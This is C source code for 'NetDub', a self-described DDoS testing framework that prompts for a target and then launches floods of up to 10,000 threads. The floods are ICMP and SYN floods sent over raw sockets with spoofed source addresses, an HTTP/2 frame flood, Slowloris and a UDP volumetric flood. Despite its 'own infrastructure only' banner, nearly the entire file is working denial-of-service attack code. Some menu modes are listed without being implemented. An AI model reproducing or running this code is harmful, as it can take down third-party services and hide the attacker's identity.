/*
 * NetDub - Ultimate DDoS Testing Framework
 * ⚠️ FOR TESTING YOUR OWN INFRASTRUCTURE ONLY ⚠️
 * Requires: sudo/root privileges, Linux only
 * 
 * Compile: gcc -o netdub netdub.c -lpthread -lssl -lcrypto
 * Usage: sudo ./netdub
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/resource.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define MAX_THREADS 10000
#define MAX_SOCKETS 65535
#define BUFFER_SIZE 65536
#define MAX_PAYLOAD 1500

// Global variables
volatile int running = 1;
volatile long long total_packets = 0;
volatile long long total_bytes = 0;
int attack_mode = 0;
char target_ip[16];
int target_port;
int thread_count = 1000;
int attack_duration = 60;

// Attack types
enum attack_type {
    LAYER3_ICMP_FLOOD = 1,
    LAYER3_UDP_FLOOD,
    LAYER4_SYN_FLOOD,
    LAYER4_ACK_FLOOD,
    LAYER4_RST_FLOOD,
    LAYER4_FIN_FLOOD,
    LAYER7_HTTP_FLOOD,
    LAYER7_HTTPS_FLOOD,
    LAYER7_SLOWLORIS,
    LAYER7_SLOW_POST,
    LAYER7_HTTP2_FLOOD,
    MIXED_AMPLIFICATION,
    VOLUMETRIC_FLOOD,
    REFLECTION_ATTACK
};

// Thread data structure
typedef struct {
    int thread_id;
    int socket_fd;
    struct sockaddr_in target_addr;
    int packets_sent;
    int bytes_sent;
} thread_data_t;

// Colors for output
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define RESET   "\033[0m"

// Signal handler
void signal_handler(int sig) {
    running = 0;
    printf("\n" RED "[!] Stopping attack..." RESET "\n");
}

// Initialize SSL context
SSL_CTX* init_ssl_context() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return NULL;
    }
    
    return ctx;
}

// Generate random IP (for spoofing)
void generate_random_ip(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", 
            rand() % 256, rand() % 256, 
            rand() % 256, rand() % 256);
}

// Calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Raw socket creation (requires root)
int create_raw_socket() {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Raw socket creation failed (need root)");
        return -1;
    }
    
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

// Layer 3 - ICMP Flood
void* icmp_flood(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    char packet[4096];
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    
    int sockfd = create_raw_socket();
    if (sockfd < 0) return NULL;
    
    while (running) {
        memset(packet, 0, 4096);
        
        // IP Header
        ip_header = (struct iphdr*)packet;
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_ICMP;
        ip_header->check = 0;
        ip_header->saddr = inet_addr("192.168.1.1"); // Spoofed source
        ip_header->daddr = inet_addr(target_ip);
        
        // ICMP Header
        icmp_header = (struct icmphdr*)(packet + sizeof(struct iphdr));
        icmp_header->type = ICMP_ECHO;
        icmp_header->code = 0;
        icmp_header->checksum = 0;
        icmp_header->un.echo.id = htons(rand() % 65535);
        icmp_header->un.echo.sequence = htons(data->packets_sent);
        
        // Calculate checksums
        ip_header->check = checksum((unsigned short*)packet, sizeof(struct iphdr));
        icmp_header->checksum = checksum((unsigned short*)icmp_header, sizeof(struct icmphdr));
        
        if (sendto(sockfd, packet, ip_header->tot_len, 0,
                   (struct sockaddr*)&data->target_addr, sizeof(data->target_addr)) > 0) {
            data->packets_sent++;
            total_packets++;
            total_bytes += ip_header->tot_len;
        }
        
        usleep(100); // 10,000 pps per thread
    }
    
    close(sockfd);
    return NULL;
}

// Layer 4 - SYN Flood
void* syn_flood(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    char packet[4096];
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    
    int sockfd = create_raw_socket();
    if (sockfd < 0) return NULL;
    
    while (running) {
        memset(packet, 0, 4096);
        
        // IP Header
        ip_header = (struct iphdr*)packet;
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = htonl(rand()); // Random source IP
        ip_header->daddr = inet_addr(target_ip);
        
        // TCP Header
        tcp_header = (struct tcphdr*)(packet + sizeof(struct iphdr));
        tcp_header->source = htons(rand() % 65535);
        tcp_header->dest = htons(target_port);
        tcp_header->seq = htonl(rand());
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->fin = 0;
        tcp_header->syn = 1;
        tcp_header->rst = 0;
        tcp_header->psh = 0;
        tcp_header->ack = 0;
        tcp_header->urg = 0;
        tcp_header->window = htons(5840);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;
        
        // Calculate checksums
        ip_header->check = checksum((unsigned short*)packet, sizeof(struct iphdr));
        
        if (sendto(sockfd, packet, ip_header->tot_len, 0,
                   (struct sockaddr*)&data->target_addr, sizeof(data->target_addr)) > 0) {
            data->packets_sent++;
            total_packets++;
            total_bytes += ip_header->tot_len;
        }
        
        usleep(50); // 20,000 pps per thread
    }
    
    close(sockfd);
    return NULL;
}

// Layer 7 - HTTP/2 Flood
void* http2_flood(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    SSL_CTX *ctx = init_ssl_context();
    if (!ctx) return NULL;
    
    while (running) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        // Set socket options for performance
        int flag = 1;
        setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        
        if (connect(sockfd, (struct sockaddr*)&data->target_addr, sizeof(data->target_addr)) == 0) {
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sockfd);
            
            if (SSL_connect(ssl) > 0) {
                // HTTP/2 connection preface
                char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                SSL_write(ssl, preface, strlen(preface));
                
                // HTTP/2 SETTINGS frame
                char settings[] = "\x00\x00\x00\x04\x00\x00\x00\x00\x00";
                SSL_write(ssl, settings, 9);
                
                // Flood with HTTP/2 frames
                for (int i = 0; i < 1000 && running; i++) {
                    char frame[] = "\x00\x00\x00\x01\x04\x00\x00\x00\x01";
                    SSL_write(ssl, frame, 9);
                    data->packets_sent++;
                    total_packets++;
                }
            }
            
            SSL_shutdown(ssl);
            SSL_free(ssl);
        }
        
        close(sockfd);
        usleep(1000);
    }
    
    SSL_CTX_free(ctx);
    return NULL;
}

// Layer 7 - Slowloris Enhanced
void* slowloris_enhanced(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    int *sockets = malloc(sizeof(int) * 1000);
    int socket_count = 0;
    
    // Create multiple connections
    for (int i = 0; i < 1000 && running; i++) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        // Set non-blocking
        int flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
        
        if (connect(sockfd, (struct sockaddr*)&data->target_addr, sizeof(data->target_addr)) == 0 ||
            errno == EINPROGRESS) {
            
            // Send partial HTTP request
            char request[1024];
            snprintf(request, sizeof(request),
                    "GET /?%d HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0 (compatible; NetDub/1.0)\r\n"
                    "Accept-language: en-US,en,q=0.5\r\n"
                    "Connection: keep-alive\r\n",
                    rand(), target_ip);
            
            send(sockfd, request, strlen(request), 0);
            sockets[socket_count++] = sockfd;
        }
    }
    
    // Keep connections alive
    while (running && socket_count > 0) {
        for (int i = 0; i < socket_count; i++) {
            char header[100];
            snprintf(header, sizeof(header), "X-a: %d\r\n", rand());
            
            if (send(sockets[i], header, strlen(header), 0) < 0) {
                close(sockets[i]);
                sockets[i] = sockets[--socket_count];
                i--;
            } else {
                data->packets_sent++;
                total_packets++;
            }
        }
        
        sleep(10);
    }
    
    // Cleanup
    for (int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
    free(sockets);
    
    return NULL;
}

// Volumetric flood (UDP amplification simulation)
void* volumetric_flood(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    char payload[MAX_PAYLOAD];
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;
    
    // Fill payload with random data
    for (int i = 0; i < MAX_PAYLOAD; i++) {
        payload[i] = rand() % 256;
    }
    
    while (running) {
        // Send large UDP packets
        if (sendto(sockfd, payload, MAX_PAYLOAD, 0,
                   (struct sockaddr*)&data->target_addr, sizeof(data->target_addr)) > 0) {
            data->packets_sent++;
            data->bytes_sent += MAX_PAYLOAD;
            total_packets++;
            total_bytes += MAX_PAYLOAD;
        }
        
        usleep(10); // 100,000 pps per thread
    }
    
    close(sockfd);
    return NULL;
}

// Statistics display
void* stats_display(void *arg) {
    time_t start_time = time(NULL);
    
    while (running) {
        sleep(1);
        
        time_t current_time = time(NULL);
        int elapsed = current_time - start_time;
        
        double pps = (double)total_packets / elapsed;
        double mbps = ((double)total_bytes * 8) / (1024 * 1024 * elapsed);
        double gbps = mbps / 1024;
        
        printf("\r" CYAN "[⚡] " WHITE "Time: %ds " GREEN "| PPS: %.0f " YELLOW "| Mbps: %.2f " RED "| Gbps: %.3f " MAGENTA "| Packets: %lld" RESET, 
               elapsed, pps, mbps, gbps, total_packets);
        fflush(stdout);
    }
    
    return NULL;
}

// Main attack function
void launch_attack() {
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thread;
    thread_data_t thread_data[MAX_THREADS];
    
    // Increase system limits (requires root)
    struct rlimit rlim;
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_NOFILE, &rlim);
    setrlimit(RLIMIT_NPROC, &rlim);
    
    // Setup target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    // Start statistics thread
    pthread_create(&stats_thread, NULL, stats_display, NULL);
    
    printf(GREEN "[✓] Launching %d threads...\n" RESET, thread_count);
    
    // Create threads based on attack mode
    for (int i = 0; i < thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].target_addr = target_addr;
        thread_data[i].packets_sent = 0;
        thread_data[i].bytes_sent = 0;
        
        void* (*attack_func)(void*) = NULL;
        
        switch (attack_mode) {
            case LAYER3_ICMP_FLOOD:
                attack_func = icmp_flood;
                break;
            case LAYER4_SYN_FLOOD:
                attack_func = syn_flood;
                break;
            case LAYER7_HTTP2_FLOOD:
                attack_func = http2_flood;
                break;
            case LAYER7_SLOWLORIS:
                attack_func = slowloris_enhanced;
                break;
            case VOLUMETRIC_FLOOD:
                attack_func = volumetric_flood;
                break;
            default:
                attack_func = syn_flood;
        }
        
        pthread_create(&threads[i], NULL, attack_func, &thread_data[i]);
        usleep(1000); // Stagger thread creation
    }
    
    // Wait for duration or signal
    sleep(attack_duration);
    running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(stats_thread, NULL);
    
    printf("\n" GREEN "[✓] Attack completed!\n" RESET);
}

// Main menu
void show_menu() {
    printf(RED "╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                        NetDub v1.0                          ║\n");
    printf("║                Ultimate DDoS Testing Framework              ║\n");
    printf("║                    ⚠️  ROOT REQUIRED ⚠️                     ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n" RESET);
    
    printf(YELLOW "\n[ATTACK MODES]\n" RESET);
    printf(WHITE "1.  Layer 3 - ICMP Flood           (Network Layer)\n");
    printf("2.  Layer 3 - UDP Flood             (Network Layer)\n");
    printf("3.  Layer 4 - SYN Flood             (Transport Layer)\n");
    printf("4.  Layer 4 - ACK Flood             (Transport Layer)\n");
    printf("5.  Layer 4 - RST Flood             (Transport Layer)\n");
    printf("6.  Layer 7 - HTTP Flood            (Application Layer)\n");
    printf("7.  Layer 7 - HTTPS Flood           (Application Layer)\n");
    printf("8.  Layer 7 - Slowloris Enhanced    (Application Layer)\n");
    printf("9.  Layer 7 - HTTP/2 Flood          (Application Layer)\n");
    printf("10. Volumetric Flood                (Multi-Gbps)\n");
    printf("11. Mixed Amplification             (All Layers)\n");
    printf("12. Reflection Attack               (Spoofed Source)\n" RESET);
    
    printf(CYAN "\n[TARGET CONFIGURATION]\n" RESET);
}

int main() {
    // Check if running as root
    if (geteuid() != 0) {
        printf(RED "[!] This program requires root privileges!\n" RESET);
        printf(YELLOW "[*] Please run: sudo %s\n" RESET, "netdub");
        return 1;
    }
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Seed random number generator
    srand(time(NULL));
    
    show_menu();
    
    // Get user input
    printf(GREEN "\n🎯 Target IP/Domain: " RESET);
    scanf("%s", target_ip);
    
    printf(GREEN "🔌 Target Port: " RESET);
    scanf("%d", &target_port);
    
    printf(GREEN "⚡ Attack Mode (1-12): " RESET);
    scanf("%d", &attack_mode);
    
    printf(GREEN "🧵 Thread Count (1-10000): " RESET);
    scanf("%d", &thread_count);
    
    printf(GREEN "⏱️  Duration (seconds): " RESET);
    scanf("%d", &attack_duration);
    
    // Validate inputs
    if (thread_count > MAX_THREADS) thread_count = MAX_THREADS;
    if (attack_duration > 3600) attack_duration = 3600; // Max 1 hour
    
    printf(RED "\n[⚠️ ] Starting attack in 5 seconds...\n" RESET);
    printf(YELLOW "[⚠️ ] Target: %s:%d\n" RESET, target_ip, target_port);
    printf(YELLOW "[⚠️ ] Mode: %d | Threads: %d | Duration: %ds\n" RESET, 
           attack_mode, thread_count, attack_duration);
    
    sleep(5);
    
    // Launch attack
    launch_attack();
    
    return 0;
}
